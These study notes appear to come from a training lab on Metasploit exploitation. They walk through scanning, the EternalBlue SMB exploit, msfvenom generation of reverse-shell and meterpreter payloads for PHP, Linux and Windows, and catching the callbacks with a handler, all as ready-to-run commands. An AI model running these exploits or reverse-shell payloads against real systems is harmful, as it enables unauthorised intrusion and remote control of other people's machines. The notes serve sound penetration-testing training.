# Metasploit — Exploits (room notes)

Below are concise, well-structured notes you can drop into a room for Metasploit: Exploits — covers port scanning modules, DB integration, workflows, msfvenom, handlers and session management.

## Port scanning in Metasploit

### List portscan modules
```
msf6 > search portscan
```

Example matching modules:
- `auxiliary/scanner/portscan/tcp` — TCP Port Scanner
- `auxiliary/scanner/portscan/syn` — TCP SYN Port Scanner
- `auxiliary/scanner/portscan/ack` — TCP ACK Firewall Scanner
- `auxiliary/scanner/portscan/ftpbounce` — FTP bounce scanner
- `auxiliary/scanner/portscan/xmas` — XMas scan

### Example: show options for TCP scanner
```
msf6 auxiliary(scanner/portscan/tcp) > show options
Module options (auxiliary/scanner/portscan/tcp):

   CONCURRENCY  10       # concurrent ports to check per host
   DELAY        0        # ms delay between connections per thread
   JITTER       0
   PORTS        1-10000  # ports to scan (range)
   RHOSTS                # target host(s)
   THREADS      1        # concurrent threads (max 1 per host)
   TIMEOUT      1000     # ms
```

**Notes**
- `PORTS` here is literal numeric range (e.g. 1-10000) — not the same list Nmap uses.
- `THREADS` and `CONCURRENCY` speed up scans but increase noisiness.

### Run Nmap from msfconsole

You can call nmap directly:
```
msf6 > nmap -sS 10.10.12.229
```

Or use `db_nmap` (see DB section) to save results to Metasploit DB:
```
msf6 > db_nmap -sV -p- 10.10.12.229
```

## UDP and service-specific scans

### Quick UDP sweep

Module: `auxiliary/scanner/discovery/udp_sweep`

```
msf6 auxiliary(scanner/discovery/udp_sweep) > run
```

This sends a handful of probes to quickly detect common UDP services (DNS, NetBIOS, etc.).

### SMB scanning examples

- `auxiliary/scanner/smb/smb_version` — fingerprint SMB/Windows versions
- `auxiliary/scanner/smb/smb_enumshares` — enumerate SMB shares

Example:
```
msf6 auxiliary(scanner/smb/smb_version) > run
[+] 10.10.12.229:445 - Host is running Windows 7 Professional SP1 ...
```

## Database integration (project/workspace management)

### Start DB and initialize

(On systems where you must initialize manually)
```
systemctl start postgresql
sudo -u postgres msfdb init
# (delete then re-init: sudo -u postgres msfdb delete)
```

### Check DB status
```
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```

### Workspaces

- List: `workspace`
- Add: `workspace -a tryhackme`
- Switch: `workspace tryhackme`
- Help: `workspace -h`

### DB commands (available when DB enabled)

- `db_nmap` — run nmap and import results
- `hosts` — list hosts in DB
- `services` — list services discovered
- `vulns`, `loot`, `notes` etc.

Example:
```
msf6 > db_nmap -sV -p- 10.10.12.229
msf6 > hosts
msf6 > services
```

You can populate module RHOSTS from DB results:
```
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > hosts -R
# populates RHOSTS => <hosts from DB>
```

## Vulnerability scanning & workflow example

### Flow

1. `db_nmap` to discover hosts/services and save to DB
2. `services -S <service>` to find interesting services (e.g., netbios, http)
3. Use specific scanners (SMB, VNC, FTP, etc.) to enumerate further.
4. Use exploit modules based on identified services/vulns.

### Example scanning for MS17-010

```
msf6 > db_nmap -sV 10.10.12.229
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > hosts -R
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
```

## Exploit selection, payloads & options

### Search and use
```
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

### Show options
```
msf6 exploit(...) > show options
# Common options: RHOSTS, RPORT, SMBUser, SMBPass, VERIFY_ARCH, VERIFY_TARGET
# Payload options section: e.g., LHOST, LPORT for reverse payloads
```

### Show payloads compatible with an exploit
```
msf6 exploit(...) > show payloads
```

### Set payload and options
```
msf6 exploit(...) > set payload generic/shell_reverse_tcp
msf6 exploit(...) > set LHOST 10.10.186.44
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > set RHOSTS 10.10.12.229
msf6 exploit(...) > exploit
```

**Tip**: if you want the exploit to run and background the session automatically:
```
exploit -z
```

## Sessions management

### Background/foreground

- Background current interactive session: `background` or CTRL+Z
- List sessions:
```
msf6 > sessions
```

- Interact with a session:
```
msf6 > sessions -i 1
# then you get shell or meterpreter prompt
```

### Sessions help options
```
msf6 > sessions -h
# options: -i (interact), -k (kill), -u (upgrade shell to meterpreter), -s (run script), etc.
```

## Msftools: msfvenom (payload generator)

`msfvenom` replaces `msfpayload` + `msfencode`. Use to build payloads across OSes and formats.

### List payloads
```
msfvenom -l payloads
```

### Common output formats

- `-f exe` (windows exe)
- `-f elf` (linux)
- `-f raw` (raw script, php, python)
- `-f asp` (ASP)
- `-f dll` (Windows DLL)

### Example payload generation

#### PHP reverse payload (raw)
```
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > rev.php
```

**Note**: some raw outputs require adding `<?php/??>` wrappers or editing to be valid files.

#### Linux ELF
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
chmod +x rev_shell.elf
```

#### Windows exe
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```

### Encoding

Encoders only encode the payload (not guaranteed AV bypass). Use `-e`:
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=... -f raw -e php/base64
```

## Handlers (catching callbacks)

When you use reverse payloads, you must run a handler to accept incoming callbacks.

### Multi/handler
```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload php/reverse_php
msf6 exploit(multi/handler) > set LHOST 10.0.2.19
msf6 exploit(multi/handler) > set LPORT 7777
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.0.2.19:7777
```

`multi/handler` supports staged/stageless payloads and meterpreter shells.

If your payload is meterpreter, the handler will give you a meterpreter session when the target connects.

## Example end-to-end flow (simple)

1. `db_nmap -sV -p- 10.10.12.229` — discover hosts & services, save to DB
2. `hosts` / `services` — review results
3. `use auxiliary/scanner/smb/smb_version` — fingerprint SMB
4. If SMB vuln found, `use exploit/windows/smb/ms17_010_eternalblue`
5. `show payloads` → `set payload <choice>`
6. `set RHOSTS 10.10.12.229` / `set LHOST <your IP>` / `set LPORT <port>`
7. `exploit` (or `exploit -z`)
8. `sessions` → `sessions -i <id>` → interact with shell/meterpreter

## Practical tips & cautions

- Exploit ranks reflect reliability; always read `info` for caveats (crash/BSOD risk).
- Test safely: run exploits only on assets you own or are authorized to test.
- Payload selection may require trial-and-error (AV, missing interpreters, rights).
- Handlers must match payload (staged vs stageless) and use correct `LHOST`.
- Use DB (`db_nmap`) for better project organization and reuse of discovered hosts.
- Be mindful of noise: many Metasploit scanners/exploits are noisy and logged.